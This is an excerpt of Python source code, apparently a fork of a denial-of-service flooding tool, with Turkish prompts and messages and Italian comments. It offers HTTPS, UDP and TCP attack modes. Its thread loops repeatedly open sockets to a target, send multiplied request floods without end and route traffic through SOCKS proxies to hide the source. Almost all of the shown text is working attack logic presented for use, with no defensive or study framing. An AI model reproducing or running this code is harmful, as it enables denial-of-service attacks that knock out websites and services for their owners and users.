...
def floodmode(): 
	global choice1
	choice1 = input("HTTPS SALDIRI ICIN '0' UDP SALDIRI ICIN '1' TCP SALDIRI ICIN '2'  ? ")
	if choice1 == "0":
		proxymode()
	elif choice1 == "1":
		try:
	...
	def run(self): # la funzione che da' le istruzioni ai vari threads
		...
		while True:
			try:
				...
				s.connect((str(url2),int(port))) # connessione
				s.send(p) # invio
				print ("SALDIRI YÖNLENDIRILIYOR " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print req + counter
				try: # invia altre richieste nello stesso thread
					for y in range(multiple): # fattore di moltiplicazione
						s.send(str.encode(p)) # encode in bytes della richiesta HTTP
				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
	...
	def run(self): # la funzione che da' le istruzioni ai vari threads
		...
		while True:
			try:
				...
				s.connect((str(url2),int(port))) # connessione
				s.send(p) # invio
				print ("Proxyler Yönlendiriliyor " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # req + counter
				try: # invia altre richieste nello stesso thread
					for y in range(multiple): # fattore di moltiplicazione
						s.send(str.encode(p)) # encode in bytes della richiesta HTTP
				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
	...
	def run(self): # la funzione che da' le istruzioni ai vari threads
		...
		while True: # ciclo infinito
			try:
				...
				print ("Proxyler Yönlendiriliyor  " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print delle richieste
				try: # invia altre richieste nello stesso thread
					for y in range(multiple): # fattore di moltiplicazione
						s.send(str.encode(request)) # encode in bytes della richiesta HTTP
				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
	...
	def run(self): # la funzione che da' le istruzioni ai vari threads
		...
		while True:
			try:
				...
				print ("Proxy Yönlendiriliyor! " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print req + counter
				try: # invia altre richieste nello stesso thread
					for y in range(multiple): # fattore di moltiplicazione
						s.send(str.encode(request)) # encode in bytes della richiesta HTTP
				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
				...
				try: # il try prova a vedere se l'errore e' causato dalla tipologia di socks errata, infatti prova con SOCKS4
					...
					print ("Proxy Kullanilmiyor. @", self.counter)
	...
	def run(self): # la funzione che da' le istruzioni ai vari threads
		...
		while True:
			try:
				...
				s.connect((str(url2), int(urlport))) # connessione
				s.send (str.encode(request)) # invio
				print ("Soket Yönlendiriliyor! @", self.counter) # print req + counter
				try: # invia altre richieste nello stesso thread
					for y in range(multiple): # fattore di moltiplicazione
						s.send(str.encode(request)) # encode in bytes della richiesta HTTP
				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
